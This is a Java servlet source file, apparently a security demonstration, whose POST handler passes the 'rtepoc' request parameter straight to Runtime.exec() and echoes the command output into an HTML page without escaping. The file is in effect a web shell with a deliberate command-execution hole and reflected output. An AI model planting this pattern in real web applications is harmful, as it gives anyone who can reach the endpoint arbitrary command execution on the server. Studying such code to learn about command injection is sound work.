package com.web;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.xml.parsers.ParserConfigurationException;
import java.io.*;

public class Run_Servlet extends HttpServlet {
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        req.setCharacterEncoding("UTF-8");
        String rte_poc = req.getParameter("rtepoc");
        System.out.println(rte_poc);
        resp.setContentType("text/html;charset=UTF-8");
        String tmp = "";
        //获取响应的输出流
        PrintWriter out = resp.getWriter();
        if (rte_poc != null) {
            //方法运行
            Process process = Runtime.getRuntime().exec(rte_poc);
            InputStream in = process.getInputStream();
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] b = new byte[1024];//获取1M的一个缓冲区
            int i = -1;
            while((i=in.read(b)) != -1)//判断是否读完
            {
                byteArrayOutputStream.write(b,0,i);
            }
            tmp = byteArrayOutputStream.toString();
            //html回显数据
            out.println("<!DOCTYPE html>");
            out.println("<html>");
            out.println("<head>");
            out.println("<meta charset=\"UTF-8\">");
            out.println("<title>查询结果</title>");
            out.println("</head>");
            out.println("<body>");
            out.println("<h1>JAVA runtime 命令执行回显</h1>");
            out.println("<table>");
            out.println("<tr>");
            out.println("<tr>");
            out.println("<td>" + tmp + "</td>");
            out.println("</tr>");
            out.println("</table>");
            out.println("</body>");
            out.println("</html>");
        }
    }
}
